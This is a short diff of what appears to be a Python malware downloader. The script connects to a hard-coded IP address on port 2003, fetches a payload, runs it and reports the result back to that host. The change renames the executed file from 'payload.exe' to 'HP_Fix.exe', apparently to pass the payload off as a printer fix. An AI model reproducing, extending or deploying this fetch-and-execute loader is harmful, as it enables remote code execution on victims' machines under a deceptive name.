@@ -6,7 +6,6 @@ ip = "157.230.232.167"
 downloader_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 downloader_socket.connect((ip,2003))
 
-
 def get_payload():
     try:
         global ip,downloader_socket
@@ -24,7 +23,7 @@ def exec_payload(name):
 def main():
     global downloader_socket
     if(get_payload()):
-        exec_payload("payload.exe")
+        exec_payload("HP_Fix.exe")
         downloader_socket.send("1".encode())
     else:
         downloader_socket.send("0".encode())
